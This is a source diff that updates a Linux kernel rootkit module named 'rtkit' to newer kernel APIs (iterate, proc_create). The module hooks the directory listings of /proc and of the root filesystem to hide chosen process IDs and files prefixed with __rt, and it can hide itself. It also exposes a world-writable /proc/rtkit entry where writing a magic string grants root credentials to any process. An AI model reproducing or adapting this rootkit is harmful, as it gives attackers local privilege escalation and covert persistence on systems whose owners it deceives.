@@ -4,6 +4,44 @@
 #include <linux/string.h>
 #include <linux/cred.h>
 #include <linux/fs.h>
+#include <asm/uaccess.h>
+
+#include <linux/proc_ns.h>
+#include <linux/spinlock.h>
+#include <linux/atomic.h>
+#include <linux/binfmts.h>
+
+/*
+ * This is not completely implemented yet. The idea is to
+ * create an in-memory tree (like the actual /proc filesystem
+ * tree) of these proc_dir_entries, so that we can dynamically
+ * add new files to /proc.
+ *
+ * The "next" pointer creates a linked list of one /proc directory,
+ * while parent/subdir create the directory structure (every
+ * /proc file has a parent, but "subdir" is NULL for all
+ * non-directory entries).
+ */
+struct proc_dir_entry {
+    unsigned int low_ino;
+    umode_t mode;
+    nlink_t nlink;
+    kuid_t uid;
+    kgid_t gid;
+    loff_t size;
+    const struct inode_operations *proc_iops;
+    const struct file_operations *proc_fops;
+    struct proc_dir_entry *next, *parent, *subdir;
+    void *data;
+    atomic_t count;     /* use count */
+    atomic_t in_use;    /* number of callers into module in progress; */
+            /* negative -> it's going away RSN */
+    struct completion *pde_unload_completion;
+    struct list_head pde_openers;   /* who did ->open, but not ->release */
+    spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
+    u8 namelen;
+    char name[];
+};
 
 #define MIN(a,b) \
    ({ typeof (a) _a = (a); \
@@ -22,8 +60,8 @@ MODULE_AUTHOR("Michal Winiarski<t3hkn0r@gmail.com>");
 static struct proc_dir_entry *proc_root;
 static struct proc_dir_entry *proc_rtkit;
 
-static int (*proc_readdir_orig)(struct file *, void *, filldir_t);
-static int (*fs_readdir_orig)(struct file *, void *, filldir_t);
+static int (*proc_iterate_orig)(struct file *, struct dir_context *);
+static int (*fs_iterate_orig)(struct file *, struct dir_context *);
 
 static filldir_t proc_filldir_orig;
 static filldir_t fs_filldir_orig;
@@ -42,6 +80,8 @@ static char hide_files = 1;
 static char module_hidden = 0;
 
 static char module_status[1024];
+
+static int size, temp;
 
 //MODULE HELPERS
 void module_hide(void)
@@ -84,16 +124,18 @@ static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t off
 {
 	int i;
 	for (i=0; i < current_pid; i++) {
+        printk("%d: %s\n", i, name);
 		if (!strcmp(name, pids_to_hide[i])) return 0;
 	}
 	if (!strcmp(name, "rtkit")) return 0;
 	return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
 }
 
-static int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
+static int proc_iterate_new(struct file *filp, struct dir_context *ctx)
 {
-	proc_filldir_orig = filldir;
-	return proc_readdir_orig(filp, dirent, proc_filldir_new);
+	proc_filldir_orig = ctx->actor;
+    *((filldir_t *)&ctx->actor) = &proc_filldir_new;
+	return proc_iterate_orig(filp, ctx);
 }
 
 static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
@@ -102,15 +144,106 @@ static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offse
 	return fs_filldir_orig(buf, name, namelen, offset, ino, d_type);
 }
 
-static int fs_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
+static int fs_iterate_new(struct file *filp, struct dir_context *ctx)
 {
-	fs_filldir_orig = filldir;
-	return fs_readdir_orig(filp, dirent, fs_filldir_new);
+	fs_filldir_orig = ctx->actor;
+    *((filldir_t *)&ctx->actor) = &fs_filldir_new;
+	return fs_iterate_orig(filp, ctx);
 }
 
-static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data)
+static ssize_t rtkit_read(struct file *file, char __user *buffer, size_t count, loff_t *ppos)
 {
-	int size;
+	if (count > temp)
+        count = temp;
+    temp = temp-count;
+  
+    copy_to_user(buffer, module_status, count);
+
+    if(count == 0) {
+        sprintf(module_status, 
+    "RTKIT\n\
+    DESC:\n\
+      hides files prefixed with __rt or 10-__rt and gives root\n\
+    CMNDS:\n\
+      mypenislong - uid and gid 0 for writing process\n\
+      hpXXXX - hides proc with id XXXX\n\
+      up - unhides last process\n\
+      thf - toogles file hiding\n\
+      mh - module hide\n\
+      ms - module show\n\
+    STATUS\n\
+      fshide: %d\n\
+      pids_hidden: %d\n\
+      module_hidden: %d\n", hide_files, current_pid, module_hidden);
+
+        size = strlen(module_status);
+        temp = size;
+	
+    }
+  
+	return count;
+}
+
+static ssize_t rtkit_write(struct file *file, const char __user *buff, size_t count, loff_t *ppos)
+{
+	if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
+		struct cred *credentials = prepare_creds();
+		credentials->uid = credentials->euid = 0;
+		credentials->gid = credentials->egid = 0;
+		commit_creds(credentials);
+	} else if (!strncmp(buff, "hp", MIN(2, count))) {//upXXXXXX hides process with given id
+		if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
+	} else if (!strncmp(buff, "up", MIN(2, count))) {//unhides last hidden process
+		if (current_pid > 0) current_pid--;
+	} else if (!strncmp(buff, "thf", MIN(3, count))) {//toggles hide files in fs
+		hide_files = !hide_files;
+	} else if (!strncmp(buff, "mh", MIN(2, count))) {//module hide
+		module_hide();
+	} else if (!strncmp(buff, "ms", MIN(2, count))) {//module hide
+		module_show();
+	}
+
+        return count;
+}
+
+//INITIALIZING/CLEANING HELPER METHODS SECTION
+static void procfs_clean(void)
+{
+	if (proc_rtkit != NULL) {
+		remove_proc_entry("rtkit", NULL);
+		proc_rtkit = NULL;
+	}
+	if (proc_fops != NULL && proc_iterate_orig != NULL) {
+		set_addr_rw(proc_fops);
+		proc_fops->iterate = proc_iterate_orig;
+		set_addr_ro(proc_fops);
+	}
+}
+	
+static void fs_clean(void)
+{
+	if (fs_fops != NULL && fs_iterate_orig != NULL) {
+		set_addr_rw(fs_fops);
+		fs_fops->iterate = fs_iterate_orig;
+		set_addr_ro(fs_fops);
+	}
+}
+
+static const struct file_operations proc_rtkit_fops = {
+    .owner = THIS_MODULE,
+    .read = rtkit_read,
+    .write = rtkit_write,
+};
+
+static int __init procfs_init(void)
+{
+	//new entry in proc root with 666 rights
+	proc_rtkit = proc_create("rtkit", 0666, NULL, &proc_rtkit_fops);
+	if (proc_rtkit == NULL) return 0;
+	proc_root = proc_rtkit->parent;
+	if (proc_root == NULL || strcmp(proc_root->name, "/proc") != 0) {
+		return 0;
+	}
 	
 	sprintf(module_status, 
 "RTKIT\n\
@@ -129,80 +262,13 @@ STATUS\n\
   module_hidden: %d\n", hide_files, current_pid, module_hidden);
 
 	size = strlen(module_status);
-
-	if (off >= size) return 0;
-  
-	if (count >= size-off) {
-		memcpy(buffer, module_status+off, size-off);
-	} else {
-		memcpy(buffer, module_status+off, count);
-	}
-  
-	return size-off;
-}
-
-static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data)
-{
-	if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
-		struct cred *credentials = prepare_creds();
-		credentials->uid = credentials->euid = 0;
-		credentials->gid = credentials->egid = 0;
-		commit_creds(credentials);
-	} else if (!strncmp(buff, "hp", MIN(2, count))) {//upXXXXXX hides process with given id
-		if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
-	} else if (!strncmp(buff, "up", MIN(2, count))) {//unhides last hidden process
-		if (current_pid > 0) current_pid--;
-	} else if (!strncmp(buff, "thf", MIN(3, count))) {//toggles hide files in fs
-		hide_files = !hide_files;
-	} else if (!strncmp(buff, "mh", MIN(2, count))) {//module hide
-		module_hide();
-	} else if (!strncmp(buff, "ms", MIN(2, count))) {//module hide
-		module_show();
-	}
+    temp = size;
 	
-        return count;
-}
-
-//INITIALIZING/CLEANING HELPER METHODS SECTION
-static void procfs_clean(void)
-{
-	if (proc_rtkit != NULL) {
-		remove_proc_entry("rtkit", NULL);
-		proc_rtkit = NULL;
-	}
-	if (proc_fops != NULL && proc_readdir_orig != NULL) {
-		set_addr_rw(proc_fops);
-		proc_fops->readdir = proc_readdir_orig;
-		set_addr_ro(proc_fops);
-	}
-}
-	
-static void fs_clean(void)
-{
-	if (fs_fops != NULL && fs_readdir_orig != NULL) {
-		set_addr_rw(fs_fops);
-		fs_fops->readdir = fs_readdir_orig;
-		set_addr_ro(fs_fops);
-	}
-}
-
-static int __init procfs_init(void)
-{
-	//new entry in proc root with 666 rights
-	proc_rtkit = create_proc_entry("rtkit", 0666, NULL);
-	if (proc_rtkit == NULL) return 0;
-	proc_root = proc_rtkit->parent;
-	if (proc_root == NULL || strcmp(proc_root->name, "/proc") != 0) {
-		return 0;
-	}
-	proc_rtkit->read_proc = rtkit_read;
-	proc_rtkit->write_proc = rtkit_write;
-	
-	//substitute proc readdir to our wersion (using page mode change)
+	//substitute proc iterate to our wersion (using page mode change)
 	proc_fops = ((struct file_operations *) proc_root->proc_fops);
-	proc_readdir_orig = proc_fops->readdir;
+	proc_iterate_orig = proc_fops->iterate;
 	set_addr_rw(proc_fops);
-	proc_fops->readdir = proc_readdir_new;
+	proc_fops->iterate = proc_iterate_new;
 	set_addr_ro(proc_fops);
 	
 	return 1;
@@ -218,10 +284,10 @@ static int __init fs_init(void)
 	fs_fops = (struct file_operations *) etc_filp->f_op;
 	filp_close(etc_filp, NULL);
 	
-	//substitute readdir of fs on which /etc is
-	fs_readdir_orig = fs_fops->readdir;
+	//substitute iterate of fs on which /etc is
+	fs_iterate_orig = fs_fops->iterate;
 	set_addr_rw(fs_fops);
-	fs_fops->readdir = fs_readdir_new;
+	fs_fops->iterate = fs_iterate_new;
 	set_addr_ro(fs_fops);
 	
 	return 1;
